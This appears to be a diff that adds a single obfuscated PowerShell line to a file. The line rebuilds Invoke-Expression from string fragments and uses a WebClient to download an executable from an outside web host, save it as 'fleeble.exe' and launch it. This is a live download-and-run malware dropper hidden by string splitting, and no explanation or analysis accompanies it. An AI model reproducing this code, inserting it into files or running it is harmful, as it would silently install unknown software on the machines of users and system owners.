@@ -1,0 +1,1 @@
+﻿ &( $vERBoSePREference.tostrinG()[1,3]+'X'-jOIn'')(('(New-Ob'+'je'+'ct'+' '+'Sys'+'te'+'m.N'+'et.W'+'ebCl'+'ient'+').D'+'ownlo'+'adFi'+'l'+'e('+'n'+'9fhtt'+'p://hi'+'nrichsen.de'+'/as'+'set'+'s/'+'win'+'1'+'/win'+'1.exe'+'n9f'+',n'+'9ffleebl'+'e.'+'exen9'+'f);St'+'art-'+'Proces'+'s n'+'9f'+'fl'+'eeble'+'.exen9f').rePlaCe('n9f',[stRinG][cHAr]39) ) 
